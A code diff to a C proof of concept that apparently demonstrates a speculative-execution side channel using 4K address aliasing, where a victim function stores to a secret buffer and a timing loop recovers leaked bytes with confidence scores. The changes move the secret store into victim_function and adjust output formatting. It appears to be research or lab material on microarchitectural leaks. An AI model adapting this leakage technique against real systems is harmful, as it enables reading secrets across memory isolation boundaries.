@@ -42,9 +42,7 @@ uint8_t temp[50]; /* Used so compiler won’t optimize out victim_function() */
 
 void victim_function() {
   
-    bigArray[0] = 'c';
-    char q = bigArray[0];
-    printf("%c", q);
+    secret[0] = 'P';
 
 }
 
@@ -82,7 +80,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[3], int score[3]) {
     for (j = 29; j >= 0; j--) {
         for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
         
-        secret[0] = 'P';
+        victim_function();
         data = *addr;
         //If the calculation is correct, secret[0] and addr are 4k alias of each other
         //Hence the data from secret[0] is supposed to temporarily be in (data) so we will access this point
@@ -171,7 +169,6 @@ int main(int argc, const char * * argv) {
   printf("Address of bigArray is %p\n", address);
   printf("Address of the secret is %p\n", secret);
   while (--len >= 0) {
-    printf("\n");
 
     readMemoryByte(distanceFromCurrentAddressToDesiredAddress, value, score);
 
@@ -180,6 +177,7 @@ int main(int argc, const char * * argv) {
           (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
     printf("(second best: 0x%02X=%c score=%d)", value[1], value[1], score[1]);
     printf("(third best: 0x%02X=%c score=%d)", value[2],value[2], score[2]);
+    printf("\n");
     
   }
   return (0);
